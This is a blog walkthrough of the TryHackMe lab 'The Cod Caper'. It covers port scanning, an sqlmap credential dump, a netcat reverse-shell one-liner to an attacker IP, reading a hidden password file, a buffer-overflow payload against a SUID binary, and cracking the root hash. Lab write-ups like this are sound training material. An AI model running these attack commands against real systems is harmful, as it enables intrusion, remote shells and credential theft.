---
layout: post
title: 'TryHackMe: The Cod Caper'
date: 2025-09-20 23:00:00 +0530
categories: [TryHackMe]
tags: [tryhackme, walkthrough, sql-injection, privilege-escalation, suid, hash-cracking, pentesting]
render_with_liquid: false
media_subpath: /images/theCodCaper/
description: "A compact walkthrough of The Cod Caper — enumeration, SQL injection, shelling, local enumeration, and SUID binary exploitation."
---

# TryHackMe: The Cod Caper — Writeup | 20 September 2025

<div align="center">
  <img src="THM.png" alt="TryHackMe Logo" width="800"/>
  <img src="The_Cod_Caper.png" alt="Room Banner" width="500"/>
</div>

**Author:** Aakash Modi

> **Short Description:**  
> A compact walkthrough of The Cod Caper — enumeration, SQL injection, shelling, local enumeration, and SUID binary exploitation.

---

## Overview

This walkthrough documents my approach to the TryHackMe room ["The Cod Caper"](https://tryhackme.com/room/thecodcaper). The room covers web enumeration, SQL injection, shell access, privilege escalation, and SUID binary exploitation to recover and crack a root hash. Follow the steps below to reproduce the flow in a safe lab environment.

---

## Reconnaissance & Scanning

### Nmap

Run a full port and service scan:

```bash
sudo nmap -Pn -T4 -n -sC -sV -p- -oN thecodcaper_scan.txt 10.201.13.85
```

**Scan Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
![nmap_scan.png](nmap_scan.png)

**Q&A:**
- **How many ports are open on the target machine?**  
  `2`
- **What is the http-title of the web server?**  
  `Apache2 Ubuntu Default Page: It works`
- **What version is the ssh service?**  
  `OpenSSH 7.2p2 Ubuntu 4ubuntu2.8`
- **What version is the http service?**  
  `Apache/2.4.18`

---

## Web Enumeration

Run Gobuster to find interesting files:

```bash
gobuster dir -u http://10.201.13.85/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o dir_results.txt -x "php,txt,html" -t 25 
```

**Results:**
```
/administrator.php    (Status: 200) [Size: 409]
/index.html           (Status: 200) [Size: 10918]
```
![gobuster.png](gobuster.png)

**Q&A:**
- **What is the name of the important file on the server?**  
  `administrator.php`

---

## SQL Injection

Capture the HTTP request for `administrator.php` and run sqlmap:

```bash
sqlmap -r req.txt -u http://10.201.13.85/administrator.php --dbs
sqlmap -r req.txt -D users --tables
sqlmap -r req.txt -D users -T users --dump
```

**Credentials Found:**
- `username: pingudad`
- `password: secretpass`

![sqlmap_dump.png](sqlmap_dump.png)

After logging in, the admin dashboard exposes a command execution feature.

**Reverse Shell Command:**
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <YOUR_IP> 8888 >/tmp/f
```
![reverse_shell.png](reverse_shell.png)

![reverse_shell_execute.png](reverse_shell_execute.png)



**Listener receives shell:**

![shell_get.png](shell_get.png)

**Find stored credentials:**
```bash
find / -name "pass" 2>/dev/null
```
Result: `/var/hidden/pass`  
![find_pass_path.png](find_pass_path.png)

---

## Privilege Escalation & Root Hash Extraction

### 1. Retrieve SSH Password

```bash
cat /var/hidden/pass
```
**Password found:** `pinguapingu`  
![find_password.png](find_password.png)

---

### 2. SSH Login & Enumeration

```bash
ssh pingu@10.201.127.143
```
![ssh_login.png](ssh_login.png)

Transfer and run LinEnum for local enumeration:

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh
scp LinEnum.sh pingu@10.201.127.143:/tmp
sh LinEnum.sh
```
![script_transfer.png](script_transfer.png)

---

### 3. SUID Binary Discovery

LinEnum reveals SUID binary: `/opt/secret/root`  
![secret_path.png](secret_path.png)

---

### 4. Manual Binary Exploitation

Analyze with GDB:

```bash
gdb /opt/secret/root
disassemble shell
```
![binary_disassemble.png](binary_disassemble.png)

Exploit:

```bash
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```
![exploit_the_binary.png](exploit_the_binary.png)

---

### 5. Root Hash Extraction & Cracking

Copy the root hash value:  
![root_hash_value.png](root_hash_value.png)  
![hash_value.png](hash_value.png)

Crack with John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt root_hash.txt
```
![john_cmd.png](john_cmd.png)

**Root password found:** `love2fish`  
![root_pass.png](root_pass.png)

---

## Summary

- Enumerated and found SSH credentials.
- Logged in and performed local enumeration.
- Discovered and exploited a SUID binary for root access.
- Extracted and cracked the root hash to obtain the final password.

---

> _A compact, step-by-step guide for "The Cod Caper" on TryHackMe — covering enumeration, exploitation, and privilege escalation for root access._


## Room Complete!

<div align="center">
  <img src="completed.png" alt="Completed" width="800"/>
</div>

---

## Happy Hacking!

<div align="center">
  <img src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExeDB3ODg0am45c252cXZiOXhldXZ1aDgzMjYxdXJuaWhkbjh1dzI4ZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/rMS1sUPhv95f2/giphy.gif" alt="Hacking GIF" width="800"/>
</div>

